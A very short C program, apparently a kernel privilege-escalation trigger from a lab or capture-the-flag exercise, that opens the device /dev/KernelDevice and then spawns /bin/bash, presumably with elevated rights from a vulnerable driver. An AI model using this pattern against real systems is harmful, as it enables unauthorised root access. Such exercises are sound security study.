#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
int main(){
    int ret = open("/dev/KernelDevice",O_RDONLY);
    system("/bin/bash");
    return 0;
}